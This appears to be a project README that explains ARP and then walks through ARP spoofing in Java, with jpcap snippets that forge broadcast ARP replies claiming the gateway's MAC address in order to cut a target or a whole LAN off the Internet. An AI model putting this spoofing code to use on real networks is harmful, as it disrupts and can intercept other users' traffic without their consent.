# ARPAttackInJava
###Outline

The Address Resolution Protocol (ARP) is a telecommunication protocol used for resolution of network layer addresses into link layer address. It's a critical function in multiple-access networks.

Nowadays, IP and Ethernet are widely used in our life. Therefore, ARP is usually used for mapping the IPv4 address to an Ethernet address (also named a MAC address).In IPv6, the functionality of ARP is provided by the Neighbor Discovery Protocol (NDP).

More Info: https://en.wikipedia.org/wiki/Address_Resolution_Protocol

###Important Feature

ARP is request and reply protocol that runs encapsulated by the line protocol. It is communicated within the boundaries of a single network, never routed across internetwork nodes. This property places ARP into the Link Layer of the Internet Protocol Suite, while in the Open Systems Interconnection (OSI) model, it is often described as residing between Layers 2 and 3, being encapsulated by Layer 2 protocols. However, ARP was not developed in the OSI framework.

###Example

For example, Yasic and Esir are both in a office local area network by wireless LAN and a wifi router which provide a gateway to connect the Internet outside.Yasic knows his PC has a IPv4 address "192.168.1.100", and Esir's PC has a IPv4 address "192.168.1.101". Now if Yasic wants to send message to Esir, he need to know the MAC address of Esir. 

First, Yasic would try to look up the MAC address of "192.168.1.101" in his PC's cached ARP table.

If the MAC address is not found, then Yasic will send a broadcast ARP message to request a answer for "192.168.1.101". Then Esir will receive this broadcast and send an ARP reply to Yasic which contains Esir's PC's MAC address.

###ARP Attack --- ARP Spoofing

Now let's think about the ARP attack. There are many techniques of ARP attack, but here I just show ARP spoofing which can make other PC in the local network could not connect to the Internet correctly.

Let's think of the situation in example, what if Yasic tell Esir that the MAC address of the default gateway is Yasic's MAC address. Obviously Esir will send all her Internet message to the "default gateway" and fail to connect the Internet finally. And, If Yasic  send the broadcast which declare that the default gateway's MAC address is his, all the computer will update their ARP table to regard the new "default gateway", then nobody could connect the Internet except Yasic finally.

###Java Realization

#####Preparation

To realize the ARP attack, we need to create the ARP message in the network layer and package the message in Ethernet frame.

Generally speaking, to accomplish this goal is hard for the network layer is protected by the operating system and unless we have the super privileges can we touch the network layer and control the frame and the message.

So now we will need to get help from some mature library functions, such as Libpcap, and jpcap.jar which is write in Java. Before we create our program, we need to put the jpcap.dll to java library path.

You can find the java library path by this word.

    System.out.println(System.getProperty("java.library.path"));

Then I don't want to teach you how to add the jpcap.jar to your projects, because as a coder, you should know it or how to resolve it by yourself.

Attack Type

We can make two type of ARP attack in the local network.

- Determine the target by MAC address and attack the target
- Send the broadcast to the local network and make all other user offline

#####Programming

- Get the net interface device

    		jpcap.NetworkInterface[] networkInterfaces = JpcapCaptor.getDeviceList();
    		jpcap.NetworkInterface networkDevice = networkInterfaces[1];
    		JpcapSender sender = JpcapSender.openDevice(networkDevice);

- Create ARP message

            ARPPacket arpPacket = new ARPPacket();
            arpPacket.hardtype = ARPPacket.HARDTYPE_ETHER;
            arpPacket.prototype = ARPPacket.PROTOTYPE_IP;
            arpPacket.operation = ARPPacket.ARP_REQUEST;
            arpPacket.hlen = 6;
            arpPacket.plen = 4;
            arpPacket.target_hardaddr = getMac("ff-ff-ff-ff-ff-ff");//or target MAC address
            arpPacket.target_protoaddr = destinationIp.getAddress();
            arpPacket.sender_hardaddr = getMac(arpBean.getLocalMac());
            arpPacket.sender_protoaddr = gateWayIp.getAddress();

- Create Ethernet frame

    		EthernetPacket ethernetPacket = new EthernetPacket();
    		ethernetPacket.frametype = EthernetPacket.ETHERTYPE_ARP;
    		ethernetPacket.dst_mac = getMac("ff-ff-ff-ff-ff-ff");//or target MAC address
    		ethernetPacket.src_mac = getMac(arpBean.getLocalMac());
    		arpPacket.datalink = ethernetPacket;

- Send message

    		sender.sendPacket(arpPacket);
